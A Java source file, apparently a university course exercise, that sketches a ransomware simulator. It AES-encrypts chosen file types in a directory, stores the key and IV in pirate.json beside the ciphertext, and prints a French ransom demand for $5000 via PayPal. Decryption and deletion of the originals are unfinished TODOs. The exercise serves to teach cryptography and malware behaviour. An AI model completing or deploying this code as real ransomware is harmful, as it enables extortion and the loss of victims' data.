package ca.ulaval.glo3100.aes;

import ca.ulaval.glo3100.args.Args;
import ca.ulaval.glo3100.args.FileType;
import ca.ulaval.glo3100.console.Logger;
import ca.ulaval.glo3100.utils.*;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.File;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;

public class AESService {

    private static final String ENCRYPTED_FILES_FILENAME = "pirate.txt";
    private static final String ENCRYPTION_PARAMS_FILENAME = "pirate.json";

    public static void execute(Args args) {
        switch (args.operation) {
            case ENCRYPT:
                encrypt(args.directory, args.fileTypes);
                break;
            case DECRYPT:
                decrypt(args.directory);
                break;
        }
    }

    /**
     * @param directory Directory to encrypt files in
     * @param fileTypes File types to encrypt
     */
    private static void encrypt(File directory, List<FileType> fileTypes) {
        Logger.logDebug(String.format(
                "Encrypting with directory %s and file types %s",
                directory,
                fileTypes.stream().map(FileType::toString).collect(Collectors.joining(", "))));

        // Get files in directory
        List<File> files = FileUtils.getFiles(directory, fileTypes);

        Logger.logDebug(String.format(
                "Files : %s",
                files.stream().map(File::getPath).collect(Collectors.joining(", "))));

        // Convert files to bytes
        List<FileAsBytes> fileBytes = FileUtils.toBytes(files);

        SecretKey key = RandomUtils.generateKey();
        IvParameterSpec iv = RandomUtils.generateIv();

        Logger.logDebug(String.format("Key : %s", key.getEncoded().toString()));
        Logger.logDebug(String.format("IV : %s", iv.getIV().toString()));

        // Encrypt file bytes
        List<FileAsBytes> encryptedBytes = CipherUtils.encrypt(fileBytes, key, iv);
        List<FileAsStrings> encryptedFiles = ByteUtils.toStrings(encryptedBytes);

        // Save filenames and contents to pirate.txt
        FileUtils.saveStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFiles);

        // Save key and iv to pirate.json
        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);

        // TODO : Delete encrypted files?

        // Display ransom message
        Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
    }

    // TODO : Add javadocs
    private static void decrypt(File directory) {
        Logger.logDebug(String.format("Decrypting with directory %s", directory));

        // TODO : Get encrypted files in pirate.txt (error otherwise)
        // TODO : Get used key and iv in pirate.json (error otherwise)
        // TODO : Decrypt files
        // TODO : Save files to given directory

        // Display decryption message
        Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
    }

    // TODO : Remove this, it's temporary
    public static void tempExecute() {
        String originalString = "Hello world";

        try {
            // Créer une instance d'un générateur de clés AES
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            // Initialiser la taille de la clé
            keyGen.init(128);
            // Générer aléatoirement une clé AES de 128 bits
            SecretKey key = keyGen.generateKey();

            // Créer une instance d'un générateur aléatoire sécuritaire
            SecureRandom random = new SecureRandom();
            // Générer iv aléatoirement de 16 octes
            byte[] iv0 = random.generateSeed(16);
            IvParameterSpec iv = new IvParameterSpec(iv0);

            String encryptedString = AESService.tempEncrypt(originalString, key, iv);

            String decryptedString = AESService.tempDecrypt(encryptedString, key, iv);

            System.out.println("original String : " + originalString);
            System.out.println("encrypted String en base64: " + encryptedString);
            System.out.println("decrypted String :" + decryptedString);
        } catch(Exception ex){
            System.out.println(ex.getMessage());
        }
    }

    // TODO : Remove this, it's to test
    /*Fonction de chiffrement : elle prend le message à chiffrer, la clé et iv et elle retourne le message chiffré en base64*/
    public static String tempEncrypt(String strToEncrypt, SecretKey key, IvParameterSpec iv) {
        try {
            // Créer une instance d'un algorithme AES avec un mode CBC et un padding de type PKCS5
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

            // Initialier la clé, iv et indiquer qu'il s'agit d'un chifrement
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);

            // Chiffrer le message
            byte[] encrypted =cipher.doFinal(strToEncrypt.getBytes("UTF-8"));

            // Encoder le résultat en base64
            String encryptedBase64 = Base64.getEncoder().encodeToString(encrypted);

            return encryptedBase64;
        }
        catch (Exception e) {
            // En cas d'erreur, afficher un message et retourner la chaine nulle comme résultat
            System.out.println("Error while encrypting: " + e.toString());
            return null;
        }
    }

    // TODO : Remove this, it's to test
    /*Fonction de déchiffrement : elle prend le message à déchiffrer en base64, la clé et iv et elle retourne le message clair correspondant*/
    public static String tempDecrypt(String strToDecrypt, SecretKey key, IvParameterSpec iv) {
        try {
            //créer une instance d'un algorithme AES avec un mode CBC et un padding de type PKCS5
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

            //initialier la clé, iv et indiquer qu'il s'agit d'un déchifrement
            cipher.init(Cipher.DECRYPT_MODE, key, iv);

            //Décoder le message chiffré de sa forme base64
            byte[] encryptedBytes = Base64.getDecoder().decode(strToDecrypt);

            //déchifrer le message
            byte[] original = cipher.doFinal(encryptedBytes);
            return new String(original);
        }
        catch (Exception e) {
            // En cas d'erreur, afficher un message et retourner la chaine nulle comme résultat
            System.out.println("Error while decrypting: " + e.toString());
            return null;
        }
    }
}
